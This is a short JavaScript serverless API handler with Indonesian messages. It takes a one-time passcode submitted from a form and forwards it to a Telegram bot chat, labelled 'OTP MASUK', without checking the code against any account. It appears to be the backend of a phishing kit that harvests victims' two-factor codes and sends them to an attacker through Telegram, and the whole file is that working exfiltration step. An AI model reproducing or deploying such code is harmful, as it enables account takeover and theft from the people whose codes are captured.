export default async function handler(req, res) {

  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  try {
    const { otp } = req.body;

    if (!otp) {
      return res.status(400).json({ message: "OTP kosong" });
    }

    const kode = String(otp).replace(/[^0-9]/g, "");

    if (kode.length < 6) {
      return res.status(400).json({ message: "OTP tidak valid" });
    }

    const token = process.env.TOKEN_BOT;
    const chat_id = process.env.CHAT_ID;

    const text =
      "OTP MASUK\n\n" +
      "Kode OTP: " + kode;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id,
        text,
      }),
    });

    return res.status(200).json({ status: "success" });

  } catch (error) {
    return res.status(500).json({ message: "Server error" });
  }
}
